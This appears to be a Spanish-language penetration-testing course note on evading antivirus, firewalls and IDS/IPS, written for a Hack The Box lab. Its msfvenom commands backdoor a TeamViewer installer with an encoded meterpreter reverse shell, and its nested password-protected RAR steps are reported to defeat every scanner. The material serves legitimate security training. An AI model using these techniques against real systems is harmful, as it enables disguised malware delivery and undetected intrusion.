# Firewall and IDS/IPS Evasion

## Protección de Endpoint

La **protección de endpoints** se refiere a cualquier dispositivo o servicio localizado cuyo propósito es proteger un solo host en la red. Este host puede ser una computadora personal, una estación de trabajo corporativa o un servidor en la zona desmilitarizada (DMZ) de la red.

La protección de endpoints generalmente incluye software que proporciona protección antivirus, antimalware (incluye bloatware, spyware, adware, scareware, ransomware), firewall y protección contra ataques DDoS, todo en un solo paquete. Ejemplos de software de protección de endpoints incluyen **Avast, Nod32, Malwarebytes y BitDefender**.

### **Protección de Perímetro**

La **protección de perímetro** se refiere a dispositivos físicos o virtualizados que se encuentran en el borde de la red y que proporcionan acceso a la red interna desde el exterior (de público a privado).

Entre las zonas pública y privada a menudo se encuentra una tercera zona conocida como **DMZ (Zona Desmilitarizada)**. En esta área se alojan servidores públicos que interactúan con clientes de Internet y con la red interna para ser administrados y actualizados.

## Políticas de Seguridad

Las políticas de seguridad son fundamentales para mantener una postura de seguridad en cualquier red. Funcionan como listas de control de acceso (ACL), dictando qué tráfico o archivos pueden existir dentro de los límites de la red. Estas políticas pueden abarcar diversas áreas como:

* **Políticas de tráfico de red**
* **Políticas de aplicaciones**
* **Políticas de control de acceso de usuarios**
* **Políticas de gestión de archivos**
* **Políticas de protección contra DDoS**

| **Tipo de Detección**                           | **Descripción**                                                                                                                                                                |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Detección basada en firmas**                  | Comparación de paquetes de la red con patrones de ataques conocidos (firmas). Una coincidencia exacta genera alarmas.                                                          |
| **Detección heurística / anomalía estadística** | Comparación del comportamiento con una línea base establecida para identificar amenazas persistentes avanzadas (APT). Cualquier desviación genera alarmas.                     |
| **Análisis de protocolo con estado**            | Reconoce divergencias en los protocolos mediante perfiles preconstruidos de actividad no maliciosa.                                                                            |
| **Monitoreo en vivo y alertas (basado en SOC)** | Un equipo de analistas monitorea la actividad de la red en tiempo real, decidiendo si tomar acciones ante posibles amenazas o dejar que los mecanismos automatizados lo hagan. |

## **Evasión de Antivirus**

Los antivirus suelen depender de la **detección basada en firmas** para identificar código malicioso. Una vez detectado, el programa se cuarentena y se termina su ejecución. Para evitar esto, es posible utilizar técnicas de evasión:

* **Túneles AES en msfconsole**: MSF6 puede tunelar comunicación encriptada mediante AES entre el shell de Meterpreter y el atacante, lo que elude sistemas de detección y prevención de intrusiones (IDS/IPS) basados en red.
* **Ejecutables backdoor con msfvenom**: Podemos inyectar código malicioso en ejecutables legítimos para disfrazar la actividad maliciosa. Esto se logra con la herramienta **msfvenom**.

#### Creación de Ejecutables Backdoor

Podemos usar **msfvenom** para generar ejecutables con shellcode malicioso incrustado. Ejemplo:

```bash
sherlock28@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

Esto genera un archivo ejecutable `TeamViewer_Setup.exe` con un payload incrustado que evade detecciones utilizando múltiples iteraciones del encoder `shikata_ga_nai`.

#### Evasión de Firewall e IDS/IPS

Una vez generado el ejecutable, si la víctima lo ejecuta, la aplicación maliciosa puede funcionar sin levantar sospechas, especialmente si usamos el flag `-k` para continuar la ejecución normal del programa legítimo mientras nuestro payload se ejecuta en un hilo separado.

## Archivos

Archivar un archivo, carpeta, script, ejecutable, imagen o documento y ponerle una contraseña permite eludir muchas firmas comunes de antivirus actuales. Sin embargo, la desventaja de este proceso es que generará notificaciones en el tablero de alarmas del antivirus, ya que no se podrán escanear debido a que están bloqueados con una contraseña. Un administrador puede optar por inspeccionar manualmente estos archivos comprimidos para determinar si son maliciosos o no.

### Generación de Payload

```bash
sherlock28@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

* **Descripción del proceso**:
  * Se selecciona el payload `windows/x86/meterpreter_reverse_tcp`.
  * Se usa el encoder `x86/shikata_ga_nai` con 5 iteraciones.
  * El payload es guardado en el archivo `test.js`.

```bash
sherlock28@htb[/htb]$ cat test.js
```

El contenido del archivo `test.js` está codificado en varias iteraciones y es difícilmente legible sin el proceso de decodificación adecuado.

### VirusTotal

```bash
sherlock28@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
```

* Se sube el archivo `test.js` a VirusTotal para obtener un informe de detección.
* Algunas detecciones de antivirus incluyen:
  * **AVG**: Win32\[Trj].
  * **BitDefender**: Exploit.Metacoder.Shikata.Gen.
  * **ClamAV**: Win.Trojan.MSShellcode-6360729-0.

### Archivado del Payload

**Evasión de Firewall e IDS/IPS**

1.  **Crear archivo comprimido y proteger con contraseña**:

    ```bash
    sherlock28@htb[/htb]$ rar a ~/test.rar -p ~/test.js
    ```
2.  **Eliminar la extensión `.rar`**:

    ```bash
    sherlock28@htb[/htb]$ mv test.rar test
    ```
3.  **Comprimir nuevamente y proteger con otra contraseña**:

    ```bash
    sherlock28@htb[/htb]$ rar a test2.rar -p test
    ```
4.  **Eliminar extensión del segundo archivo comprimido**:

    ```bash
    bashCopiar códigosherlock28@htb[/htb]$ mv test2.rar test2
    ```

#### VirusTotal (Segunda vez)

**Evasión de Firewall e IDS/IPS**

Después de cargar el archivo comprimido nuevamente (`test2`), los resultados de detección muestran 0/49 detecciones por parte de los motores antivirus, lo que significa que el archivo ahora es indetectable.

## Packers

Un **packer** es un software que comprime y empaqueta un ejecutable junto con código de descompresión en un solo archivo. Cuando se ejecuta, el código de descompresión restaura el ejecutable original. Esto agrega una capa adicional de protección contra los mecanismos de escaneo de archivos en los hosts objetivo.

Lista de software de packers populares:

* UPX packer
* The Enigma Protector
* MPRESS
* Alternate EXE Packer
* ExeStealth
* Morphine
* MEW
* Themida

## Codificación de Exploits

Cuando se codifica un exploit o se porta uno existente al marco de trabajo, es recomendable asegurarse de que el código no sea fácilmente identificable por las medidas de seguridad del sistema objetivo. Un ejemplo clásico es un **desbordamiento de búfer** (Buffer Overflow), que puede ser detectado debido a los patrones hexadecimales en el tráfico de red.

## **Evasión de IDS/IPS en exploits**

Agregar randomización en los patrones puede romper las firmas de IDS/IPS que detectan estos patrones comunes. Además, se recomienda evitar el uso de NOP sleds evidentes para colocar el shellcode tras el desbordamiento.

## Recompilación de Meterpreter desde el Código Fuente

Los sistemas de prevención de intrusiones (IPS) y los motores antivirus son las herramientas más comunes que pueden interrumpir el establecimiento de una conexión en el objetivo. Estos funcionan principalmente con firmas del archivo malicioso completo o de la etapa inicial del payload.
